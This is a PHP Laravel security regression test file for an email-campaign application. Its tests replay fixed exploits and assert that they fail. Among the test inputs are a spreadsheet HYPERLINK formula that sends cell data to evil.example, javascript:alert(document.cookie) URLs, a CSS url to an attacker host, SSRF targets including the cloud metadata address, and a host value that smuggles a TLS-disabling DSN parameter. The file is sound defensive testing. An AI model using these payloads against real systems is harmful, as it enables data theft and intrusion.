<?php

namespace Tests\Feature;

use App\Models\Campaign;
use App\Models\CampaignLog;
use App\Models\Contact;
use App\Models\ContactList;
use App\Models\EmailTemplate;
use App\Models\Permission;
use App\Models\Role;
use App\Models\SmtpConfig;
use App\Models\SuppressionList;
use App\Models\User;
use App\Services\EmailTemplateBuilderService;
use App\Services\TrackingUrlSigner;
use Database\Seeders\RolesAndPermissionsSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Str;
use Tests\TestCase;

/**
 * Each test here is a concrete exploit against a vulnerability this codebase
 * actually shipped. They are written from the attacker's side on purpose: if one
 * of them starts passing in the "attack succeeded" direction, the fix regressed.
 */
class SecurityTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();

        $this->seed(RolesAndPermissionsSeeder::class);
    }

    private function userWithRole(string $slug): User
    {
        return User::factory()->roles([$slug])->create();
    }

    /** A user carrying exactly the given permission slugs, and nothing else. */
    private function userWithPermissions(string $name, array $slugs): User
    {
        $role = Role::create(['name' => $name, 'slug' => Str::slug($name), 'is_system' => false]);
        $role->permissions()->sync(Permission::whereIn('slug', $slugs)->pluck('id'));

        $user = User::factory()->withoutRoles()->create();
        $user->roles()->attach($role);

        return $user;
    }

    /** A campaign with one pending recipient, owned by $user. */
    private function campaignFor(User $user, string $email = 'recipient@example.com'): array
    {
        $list = ContactList::create(['user_id' => $user->id, 'name' => 'List']);
        $contact = Contact::create([
            'contact_list_id' => $list->id,
            'email' => $email,
            'first_name' => 'Recipient',
            'status' => 'active',
        ]);

        $campaign = Campaign::create([
            'user_id' => $user->id,
            'name' => 'Campaign',
            'subject' => 'Subject',
        ]);

        $log = CampaignLog::create([
            'campaign_id' => $campaign->id,
            'contact_id' => $contact->id,
            'recipient_email' => $email,
            'tracking_token' => Str::uuid()->toString(),
            'status' => 'sent',
        ]);

        return [$campaign, $contact, $log];
    }

    /*
    |--------------------------------------------------------------------------
    | C1 — unauthenticated cross-tenant suppression poisoning
    |--------------------------------------------------------------------------
    */

    public function test_unsubscribe_ignores_a_caller_supplied_email(): void
    {
        $victim = User::factory()->create();
        $list = ContactList::create(['user_id' => $victim->id, 'name' => 'Victim list']);
        Contact::create([
            'contact_list_id' => $list->id,
            'email' => 'target@example.com',
            'status' => 'active',
        ]);

        // The old endpoint fell back to ?email= whenever the token missed, so
        // this single unauthenticated request suppressed any address on demand.
        $this->post('/unsubscribe/not-a-real-token?email=target@example.com')
            ->assertStatus(200);

        $this->assertDatabaseMissing('suppression_lists', ['email' => 'target@example.com']);
        $this->assertDatabaseHas('contacts', [
            'email' => 'target@example.com',
            'status' => 'active',
        ]);
    }

    public function test_an_unsubscribe_does_not_reach_another_tenants_contacts(): void
    {
        $sender = User::factory()->create();
        $bystander = User::factory()->create();

        [, , $log] = $this->campaignFor($sender, 'shared@example.com');

        // The same address also sits on an unrelated account's list.
        $otherList = ContactList::create(['user_id' => $bystander->id, 'name' => 'Other']);
        Contact::create([
            'contact_list_id' => $otherList->id,
            'email' => 'shared@example.com',
            'status' => 'active',
        ]);

        $this->post(route('unsubscribe.confirm', $log->tracking_token))->assertStatus(200);

        // Suppressed for the sender...
        $this->assertDatabaseHas('suppression_lists', [
            'user_id' => $sender->id,
            'email' => 'shared@example.com',
        ]);

        // ...and untouched everywhere else.
        $this->assertDatabaseMissing('suppression_lists', ['user_id' => $bystander->id]);
        $this->assertSame('active', Contact::where('contact_list_id', $otherList->id)->value('status'));
    }

    public function test_unsubscribe_get_is_read_only(): void
    {
        $sender = User::factory()->create();
        [, , $log] = $this->campaignFor($sender, 'scanned@example.com');

        // Mail scanners and browser prefetch fire GETs; a GET that suppressed the
        // recipient would unsubscribe people who never clicked.
        $this->get(route('unsubscribe', $log->tracking_token))->assertStatus(200);

        $this->assertDatabaseCount('suppression_lists', 0);
        $this->assertSame('active', $log->contact->fresh()->status);
    }

    /*
    |--------------------------------------------------------------------------
    | C2 — campaigns.launch bypass via send_now
    |--------------------------------------------------------------------------
    */

    public function test_send_now_cannot_launch_without_the_launch_permission(): void
    {
        // The shipped member role has campaigns.create but deliberately not
        // campaigns.launch. store() called launchCampaign() as a plain method,
        // which skipped the route middleware entirely.
        $member = User::factory()->roles(['member'])->create();

        $this->assertTrue($member->hasPermission('campaigns.create'));
        $this->assertFalse($member->hasPermission('campaigns.launch'));

        $smtp = SmtpConfig::create([
            'user_id' => $member->id, 'title' => 'Relay', 'host' => 'smtp.example.com',
            'port' => 587, 'encryption' => 'tls',
        ]);
        $list = ContactList::create(['user_id' => $member->id, 'name' => 'List']);
        $template = EmailTemplate::create([
            'user_id' => $member->id, 'name' => 'T', 'subject' => 'S', 'body_html' => '<p>Hi</p>',
        ]);

        $this->actingAs($member)->post(route('campaigns.store'), [
            'name' => 'Sneaky', 'subject' => 'Sneaky',
            'smtp_config_id' => $smtp->id,
            'contact_list_id' => $list->id,
            'email_template_id' => $template->id,
            'delay_seconds' => 0,
            'send_now' => 1,
        ])->assertForbidden();

        $this->assertDatabaseCount('campaigns', 0);
    }

    /*
    |--------------------------------------------------------------------------
    | H1 / H2 — privilege escalation through the permission editor
    |--------------------------------------------------------------------------
    */

    public function test_an_override_cannot_grant_a_permission_the_actor_lacks(): void
    {
        $actor = $this->userWithPermissions('User Admin', ['users.view', 'users.update', 'users.create']);
        $target = User::factory()->withoutRoles()->create();

        $this->actingAs($actor)->put(route('admin.users.update', $target->id), [
            'name' => $target->name,
            'email' => $target->email,
            'is_active' => 1,
            'overrides' => ['campaigns.launch' => 'allow', 'roles.create' => 'allow'],
        ]);

        // The actor holds neither slug, so neither may be handed out.
        $this->assertFalse($target->fresh()->hasPermission('campaigns.launch'));
        $this->assertFalse($target->fresh()->hasPermission('roles.create'));
    }

    public function test_a_user_cannot_edit_their_own_roles_or_overrides(): void
    {
        $actor = $this->userWithPermissions('User Admin', ['users.view', 'users.update', 'users.create']);

        $this->actingAs($actor)->put(route('admin.users.update', $actor->id), [
            'name' => 'Renamed',
            'email' => $actor->email,
            'is_active' => 1,
            'overrides' => ['users.view' => 'allow', 'users.delete' => 'allow'],
        ]);

        $actor = $actor->fresh();

        // The ordinary profile fields still save...
        $this->assertSame('Renamed', $actor->name);
        // ...but nothing about their own access level moved.
        $this->assertFalse($actor->hasPermission('users.delete'));
        $this->assertDatabaseCount('permission_user', 0);
    }

    public function test_a_role_cannot_be_given_permissions_the_actor_lacks(): void
    {
        $actor = $this->userWithPermissions('Role Editor', ['roles.view', 'roles.update']);
        $editorRole = $actor->roles()->firstOrFail();

        // Escalating by editing the very role you are standing in.
        $this->actingAs($actor)->put(route('admin.roles.update', $editorRole->id), [
            'name' => 'Role Editor',
            'permissions' => ['roles.view', 'roles.update', 'users.delete', 'campaigns.launch'],
        ]);

        $slugs = $editorRole->fresh()->permissions->pluck('slug')->all();

        $this->assertContains('roles.update', $slugs);
        $this->assertNotContains('users.delete', $slugs);
        $this->assertNotContains('campaigns.launch', $slugs);
    }

    public function test_a_role_slug_cannot_be_normalized_onto_super_admin(): void
    {
        $admin = $this->userWithRole('super-admin');

        // Str::slug() runs after validation, so "Super Admin" used to pass the
        // unique check and then land on the super-admin slug — which short
        // circuits every permission check.
        $this->actingAs($admin)->post(route('admin.roles.store'), [
            'name' => 'Sneaky',
            'slug' => 'Super Admin',
        ])->assertSessionHasErrors('slug');

        $this->assertSame(1, Role::where('slug', Role::SUPER_ADMIN)->count());
    }

    /*
    |--------------------------------------------------------------------------
    | H6 — open redirect
    |--------------------------------------------------------------------------
    */

    public function test_click_tracking_refuses_an_unsigned_destination(): void
    {
        $sender = User::factory()->create();
        [, , $log] = $this->campaignFor($sender);

        $this->get(route('track.click', ['token' => $log->tracking_token, 'url' => 'https://phishing.example']))
            ->assertRedirect('/');

        // A tampered signature is no better than none.
        $this->get(route('track.click', [
            'token' => $log->tracking_token,
            'url' => 'https://phishing.example',
            'sig' => 'not-the-signature',
        ]))->assertRedirect('/');
    }

    public function test_click_tracking_follows_a_signed_destination(): void
    {
        $sender = User::factory()->create();
        [, , $log] = $this->campaignFor($sender);

        $url = 'https://legitimate.example/offer';
        $sig = (new TrackingUrlSigner)->sign($url);

        $this->get(route('track.click', ['token' => $log->tracking_token, 'url' => $url, 'sig' => $sig]))
            ->assertRedirect($url);
    }

    public function test_a_signed_javascript_url_is_still_refused(): void
    {
        $sender = User::factory()->create();
        [, , $log] = $this->campaignFor($sender);

        $url = 'javascript:alert(document.cookie)';

        $this->get(route('track.click', [
            'token' => $log->tracking_token,
            'url' => $url,
            'sig' => (new TrackingUrlSigner)->sign($url),
        ]))->assertRedirect('/');
    }

    /*
    |--------------------------------------------------------------------------
    | M7 — avatar IDOR
    |--------------------------------------------------------------------------
    */

    public function test_a_user_cannot_read_another_users_avatar(): void
    {
        $owner = User::factory()->create(['avatar_path' => 'avatars/1/photo.png']);
        $snooper = User::factory()->roles(['member'])->create();

        $this->actingAs($snooper)->get(route('profile.avatar', $owner->id))->assertForbidden();
    }

    /*
    |--------------------------------------------------------------------------
    | C3 — rate limiting
    |--------------------------------------------------------------------------
    */

    public function test_login_is_rate_limited(): void
    {
        RateLimiter::clear('login');

        $user = User::factory()->create();

        for ($attempt = 0; $attempt < 5; $attempt++) {
            $this->post(route('login.post'), [
                'email' => $user->email,
                'password' => 'wrong-password',
            ]);
        }

        $this->post(route('login.post'), [
            'email' => $user->email,
            'password' => 'wrong-password',
        ])->assertStatus(429);
    }

    /*
    |--------------------------------------------------------------------------
    | M6 — registration is closed by default
    |--------------------------------------------------------------------------
    */

    public function test_registration_is_closed_unless_enabled(): void
    {
        config(['mailflow.allow_registration' => false]);

        $this->get(route('register'))->assertNotFound();
        $this->post(route('register.post'), [
            'name' => 'Walk In',
            'email' => 'walkin@example.com',
            'password' => 'Str0ngPassword!',
            'password_confirmation' => 'Str0ngPassword!',
        ])->assertNotFound();

        $this->assertDatabaseMissing('users', ['email' => 'walkin@example.com']);
    }

    /*
    |--------------------------------------------------------------------------
    | H3 — SSRF via the SMTP relay host
    |--------------------------------------------------------------------------
    */

    public function test_an_smtp_relay_cannot_point_into_private_space(): void
    {
        $user = $this->userWithRole('super-admin');

        foreach (['127.0.0.1', '169.254.169.254', '10.0.0.5', 'localhost'] as $host) {
            $this->actingAs($user)->post(route('smtp.store'), [
                'title' => 'Internal', 'host' => $host, 'port' => 587, 'encryption' => 'tls',
            ])->assertSessionHasErrors('host');
        }

        // And the DSN metacharacters that used to disable TLS verification.
        $this->actingAs($user)->post(route('smtp.store'), [
            'title' => 'Sneaky', 'host' => 'smtp.example.com?verify_peer=0',
            'port' => 587, 'encryption' => 'tls',
        ])->assertSessionHasErrors('host');

        $this->assertDatabaseCount('smtp_configs', 0);
    }

    public function test_an_smtp_relay_is_confined_to_mail_ports(): void
    {
        $user = $this->userWithRole('super-admin');

        $this->actingAs($user)->post(route('smtp.store'), [
            'title' => 'Scanner', 'host' => 'smtp.example.com', 'port' => 3306, 'encryption' => 'tls',
        ])->assertSessionHasErrors('port');
    }

    /*
    |--------------------------------------------------------------------------
    | M1 — CSV formula injection
    |--------------------------------------------------------------------------
    */

    public function test_csv_export_neutralizes_spreadsheet_formulas(): void
    {
        $user = $this->userWithRole('super-admin');
        $list = ContactList::create(['user_id' => $user->id, 'name' => 'Payloads']);

        Contact::create([
            'contact_list_id' => $list->id,
            'email' => 'victim@example.com',
            'first_name' => '=HYPERLINK("https://evil.example/?d="&A1,"click")',
            'company' => '+1234',
            'status' => 'active',
        ]);

        $response = $this->actingAs($user)->get(route('contacts.export-csv', $list->id));
        $response->assertStatus(200);

        $csv = $response->streamedContent();

        $this->assertStringNotContainsString(',=HYPERLINK', $csv);
        $this->assertStringContainsString("'=HYPERLINK", $csv);
        $this->assertStringContainsString("'+1234", $csv);
    }

    /*
    |--------------------------------------------------------------------------
    | H7 / L4 — template builder output
    |--------------------------------------------------------------------------
    */

    public function test_the_builder_refuses_a_javascript_button_url(): void
    {
        $builder = new EmailTemplateBuilderService;

        $design = $builder->normalize([
            'button_url' => 'javascript:alert(document.cookie)',
            'background_color' => '#fff;background-image:url(https://evil.example/x)',
        ]);

        $this->assertStringNotContainsString('javascript:', $design['button_url']);
        $this->assertStringNotContainsString('evil.example', $design['background_color']);
        $this->assertStringNotContainsString('javascript:', $builder->render($design));
    }

    /*
    |--------------------------------------------------------------------------
    | M2 — baseline response headers
    |--------------------------------------------------------------------------
    */

    public function test_security_headers_are_present(): void
    {
        $user = User::factory()->create();

        $response = $this->actingAs($user)->get(route('dashboard'));

        $response->assertHeader('X-Frame-Options', 'DENY');
        $response->assertHeader('X-Content-Type-Options', 'nosniff');
        $response->assertHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
        $this->assertStringContainsString(
            "frame-ancestors 'none'",
            $response->headers->get('Content-Security-Policy')
        );
    }

    /*
    |--------------------------------------------------------------------------
    | Suppression scoping at send time
    |--------------------------------------------------------------------------
    */

    public function test_another_tenants_suppression_does_not_shrink_your_campaign(): void
    {
        $sender = $this->userWithRole('super-admin');
        $other = User::factory()->create();

        $list = ContactList::create(['user_id' => $sender->id, 'name' => 'List']);
        Contact::create([
            'contact_list_id' => $list->id,
            'email' => 'reachable@example.com',
            'status' => 'active',
        ]);

        // Somebody else suppressed the very same address on their own account.
        SuppressionList::create([
            'user_id' => $other->id,
            'email' => 'reachable@example.com',
            'reason' => 'unsubscribed',
        ]);

        $smtp = SmtpConfig::create([
            'user_id' => $sender->id, 'title' => 'Relay', 'host' => 'smtp.example.com',
            'port' => 587, 'encryption' => 'tls',
        ]);
        $template = EmailTemplate::create([
            'user_id' => $sender->id, 'name' => 'T', 'subject' => 'S', 'body_html' => '<p>Hi</p>',
        ]);

        $this->actingAs($sender)->post(route('campaigns.store'), [
            'name' => 'Send', 'subject' => 'Send',
            'smtp_config_id' => $smtp->id,
            'contact_list_id' => $list->id,
            'email_template_id' => $template->id,
            'delay_seconds' => 0,
        ]);

        $this->assertSame(1, Campaign::first()->total_recipients);
    }
}
